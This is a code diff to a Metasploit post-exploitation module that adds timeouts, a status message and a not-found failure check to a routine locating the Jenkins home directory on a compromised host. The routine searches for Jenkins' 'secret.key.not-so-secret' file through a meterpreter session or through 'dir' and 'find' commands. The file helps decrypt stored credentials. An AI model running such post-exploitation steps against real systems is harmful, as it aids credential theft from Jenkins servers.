@@ -303,21 +303,21 @@ class MetasploitModule < Msf::Post
   end
 
   def find_home(platform)
+    print_status("Searching for Jenkins directory... This could take some time...")
     case platform
     when "windows"
       case session.type
       when 'meterpreter'
         home = session.fs.file.search(nil, "secret.key.not-so-secret")[0]["path"]
       else
-        home = cmd_exec("cmd.exe", "/c dir /b /s c:\*secret.key.not-so-secret").split("\\")[0..-2].join("\\").strip
+        home = cmd_exec("cmd.exe", "/c dir /b /s c:\*secret.key.not-so-secret", timeout=120).split("\\")[0..-2].join("\\").strip
       end
-      print_status("Found Jenkins installation at #{home}")
-      home
     when "nix"
-      home = cmd_exec("find", "/ -name 'secret.key.not-so-secret' 2>/dev/null").split('/')[0..-2].join('/').strip
-      print_status("Found Jenkins installation at #{home}")
-      return home
+      home = cmd_exec("find", "/ -name 'secret.key.not-so-secret' 2>/dev/null", timeout=120).split('/')[0..-2].join('/').strip
     end
+    fail_with(Failure::NotFound, "No Jenkins installation found or readable, exiting...") if !exist?(home)
+    print_status("Found Jenkins installation at #{home}")
+    home
   end
 
   def gathernix
